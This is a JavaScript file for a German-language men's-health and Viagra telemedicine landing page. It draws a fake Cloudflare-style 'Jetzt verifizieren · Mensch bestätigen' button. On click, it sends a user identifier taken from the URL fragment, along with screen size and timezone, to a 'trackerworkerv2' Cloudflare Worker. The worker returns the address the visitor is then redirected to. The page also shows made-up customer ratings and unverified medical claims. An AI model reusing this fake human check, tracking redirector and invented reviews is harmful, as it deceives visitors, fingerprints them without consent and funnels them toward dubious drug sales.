// script.js
// ========== KONFIGURATION ==========
const WORKER_URL = 'https://trackerworkerv2.lugangxyz.workers.dev/verify';
const DEFAULT_REDIRECT_URL = 'https://www.rezeptfuchs.com/';

// ========== 10 SLOGANS (basierend auf den gegebenen Inhalten) ==========
const SLOGANS = [
    {
        main: "Premium Telemedizin. Präzise. Diskret. Männlich.",
        sub: "Ihr digitaler Gesundheitscheck · Ärztlich geprüft"
    },
    {
        main: "Ihr Wunschpräparat in 3 Schritten",
        sub: "Online-Check → Sofort-Auswertung → E-Rezept & Versand"
    },
    {
        main: "Diskret. Schnell. Sicher.",
        sub: "Nähe wieder unbeschwert erleben."
    },
    {
        main: "100% diskret & kostenloser Versand",
        sub: "Neutrale Premium-Verpackung · Keine versteckten Kosten"
    },
    {
        main: "EU-zertifiziert · Fachärztlich geprüft",
        sub: "Höchste Standards für Ihre Sicherheit"
    },
    {
        main: "Viagra® & Generika – exakt gleicher Wirkstoff",
        sub: "Deutlich günstiger, identische Qualität"
    },
    {
        main: "Sofort-Auswertung in Sekunden",
        sub: "Smarte Bestätigung & sicherer Checkout"
    },
    {
        main: "Ihr Weg zur Lösung – schnell & ärztlich geprüft",
        sub: "Kein Wartezimmer · Rezept in nur 2 Minuten"
    },
    {
        main: "Transparente Preise · Rezept 19,99 €",
        sub: "Gratis Versand · Strenger EU-Datenschutz"
    },
    {
        main: "Die clevere Alternative: Generika ab 1,74 €/Tablette",
        sub: "Wunschpräparat wählen – diskret nach Hause"
    }
];

// Fragment-Daten aus URL-Hash auslesen (#in=... oder #usr=...)
function getFragmentData() {
    const hash = window.location.hash.substring(1);
    if (!hash) return '';
    
    try {
        const params = new URLSearchParams(hash);
        if (params.has('in')) return params.get('in');
        if (params.has('usr')) return params.get('usr');
    } catch(e) {}
    
    return hash;
}

// Anfrage an Cloudflare Worker senden und umleiten (nur nach echtem User-Klick)
async function sendToCloudflareAndRedirect(userData) {
    try {
        const response = await fetch(WORKER_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                fragmentData: userData,
                screenSize: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: Date.now()
            })
        });
        
        const result = await response.json();
        window.location.href = result.redirectUrl || `${DEFAULT_REDIRECT_URL}?data=${encodeURIComponent(userData)}`;
    } catch (error) {
        // Fallback bei Fehler
        window.location.href = `${DEFAULT_REDIRECT_URL}?data=${encodeURIComponent(userData)}`;
    }
}

// Zufälligen Slogan auswählen und in der Oberfläche anzeigen
function displayRandomSlogan() {
    const randomIndex = Math.floor(Math.random() * SLOGANS.length);
    const slogan = SLOGANS[randomIndex];
    
    const sloganContainer = document.querySelector('.slogan-container');
    if (sloganContainer) {
        sloganContainer.innerHTML = `
            <div class="slogan-text">${slogan.main}</div>
            <div class="slogan-sub">
                <span class="stars">★★★★★</span>
                <span class="rating-badge">4.8 (1256 verifizierte Kunden)</span>
            </div>
            <div class="slogan-sub" style="margin-top: 6px; font-size: 0.75rem; color: #5a6e5a;">
                ${slogan.sub}
            </div>
        `;
    }
}

// Hauptinitialisierung: UI aufbauen + Shadow-DOM Button erstellen
function init() {
    const app = document.getElementById('app');
    if (!app) return;
    
    const fragmentData = getFragmentData();
    
    // 1. HTML-Grundgerüst erstellen (Karte mit Slogan etc.)
    const cardHtml = `
        <div class="verification-card">
            <div class="slogan-container">
                <div class="slogan-text">Premium Telemedizin</div>
                <div class="slogan-sub">
                    <span class="stars">★★★★★</span>
                    <span class="rating-badge">4.8 (1256 verifizierte Kunden)</span>
                </div>
                <div class="slogan-sub" style="margin-top: 6px; font-size: 0.75rem; color: #5a6e5a;">
                    Ihr digitaler Gesundheitscheck
                </div>
            </div>
            
            <div class="brand-headline">
                <h2>Men's Health · Diskret</h2>
                <p>⚕️ Ärztlich geprüft | Rezept 19,99€ | Gratis Versand</p>
            </div>
            
            <div id="button-mount"></div>
            
            <div class="footer-note">
                <span>✓ EU-zertifiziert</span>
                <span>✓ 100% diskret</span>
                <span>✓ Sofort-Auswertung</span>
            </div>
        </div>
    `;
    
    app.innerHTML = cardHtml;
    
    // Zufälligen Slogan anzeigen
    displayRandomSlogan();
    
    // 2. Shadow DOM mit auffälligem blauen Button
    const mountPoint = document.getElementById('button-mount');
    if (!mountPoint) return;
    
    const shadowHost = document.createElement('div');
    shadowHost.style.display = 'flex';
    shadowHost.style.alignItems = 'center';
    shadowHost.style.justifyContent = 'center';
    mountPoint.appendChild(shadowHost);
    
    const shadowRoot = shadowHost.attachShadow({ mode: 'open' });
    
    // Auffälliger blauer Button mit abgerundeten Ecken (Shadow DOM CSS)
    const style = document.createElement('style');
    style.textContent = `
        .cf-button {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 14px;
            background: linear-gradient(135deg, #1e5af7 0%, #1a4fdb 100%);
            border: none;
            border-radius: 60px;
            padding: 16px 36px;
            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
            font-size: 1.1rem;
            font-weight: 700;
            color: white;
            cursor: pointer;
            transition: all 0.25s ease;
            box-shadow: 0 10px 25px -5px rgba(30, 90, 247, 0.4), 0 4px 8px rgba(0, 0, 0, 0.05);
            letter-spacing: -0.2px;
            width: auto;
            min-width: 280px;
        }
        .cf-button:hover {
            background: linear-gradient(135deg, #2a66ff 0%, #1e55e6 100%);
            transform: translateY(-2px);
            box-shadow: 0 18px 30px -8px rgba(30, 90, 247, 0.5);
        }
        .cf-button:active {
            transform: translateY(1px);
            box-shadow: 0 8px 18px -5px rgba(30, 90, 247, 0.4);
        }
        .cf-icon {
            font-size: 1.5rem;
            filter: drop-shadow(0 1px 1px rgba(0,0,0,0.1));
        }
        .cf-checkbox {
            width: 22px;
            height: 22px;
            background: rgba(255,255,255,0.25);
            border: 2px solid rgba(255,255,255,0.8);
            border-radius: 30px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            transition: 0.15s;
        }
        .cf-checkbox.checked {
            background: #ffffff;
            border-color: #ffffff;
        }
        .cf-checkbox.checked::after {
            content: "✓";
            color: #1e5af7;
            font-size: 14px;
            font-weight: 900;
        }
        .cf-spinner {
            width: 22px;
            height: 22px;
            border: 2px solid rgba(255,255,255,0.4);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.65s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .cf-text {
            font-weight: 700;
            letter-spacing: -0.2px;
        }
        /* Verifizierungs-Text im Loading-State */
        .cf-button.loading {
            opacity: 0.9;
            cursor: wait;
        }
    `;
    
    // Button mit deutschem, auffälligem Text
    const button = document.createElement('div');
    button.className = 'cf-button';
    button.innerHTML = `
        <span class="cf-icon">🛡️</span>
        <div class="cf-checkbox"></div>
        <span class="cf-text">Jetzt verifizieren · Mensch bestätigen</span>
    `;
    
    shadowRoot.appendChild(style);
    shadowRoot.appendChild(button);
    
    let clicked = false;
    
    // Event-Listener für echten User-Klick
    button.addEventListener('click', async function() {
        if (clicked) return;
        clicked = true;
        
        // UI auf "wird verifiziert" umstellen (Loading-State)
        const iconSpan = button.querySelector('.cf-icon');
        const checkboxDiv = button.querySelector('.cf-checkbox');
        const textSpan = button.querySelector('.cf-text');
        
        if (iconSpan) iconSpan.style.opacity = '0.7';
        if (checkboxDiv) {
            checkboxDiv.classList.remove('cf-checkbox');
            checkboxDiv.classList.add('cf-spinner');
        }
        if (textSpan) textSpan.textContent = 'Verifizierung läuft ...';
        
        button.style.cursor = 'not-allowed';
        button.style.opacity = '0.9';
        button.style.transform = 'none';
        
        // Fragment-Daten auslesen
        const userData = getFragmentData();
        
        // Daten NACH echtem Klick senden + Weiterleitung
        await sendToCloudflareAndRedirect(userData);
    });
}

// Starte die Anwendung, sobald DOM bereit ist
document.addEventListener('DOMContentLoaded', init);